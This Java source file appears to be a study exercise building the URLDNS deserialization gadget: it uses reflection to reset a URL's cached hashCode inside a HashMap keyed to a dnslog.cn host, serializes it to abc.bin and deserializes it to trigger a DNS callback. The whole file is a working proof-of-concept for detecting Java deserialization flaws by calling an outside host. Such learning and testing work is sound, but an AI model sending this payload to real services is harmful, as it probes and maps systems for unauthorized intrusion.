package reflect;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class HashmapSer {

    public static void main(String[] args) throws IOException, ClassNotFoundException, InvocationTargetException, IllegalAccessException, NoSuchFieldException {

        HashMap<URL, Integer> hash1 = new HashMap<URL, Integer>();

        URL url = new URL("http://sfld34.dnslog.cn");
//
//        hash1.put(url, -1);

        Field field = Class.forName("java.net.URL").getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(url,1);
        hash1.put(url,123);
        field.set(url,-1);
        Serialize(hash1);

        Deserialize();
    }
    public static void Serialize(Object obj) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("abc.bin");
        ObjectOutputStream out = new ObjectOutputStream(fileOutputStream);
        out.writeObject(obj);
        out.close();
    }
    public static void Deserialize() throws IOException, ClassNotFoundException {

        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("abc.bin"));
        objectInputStream.readObject();
        objectInputStream.close();
    }
}
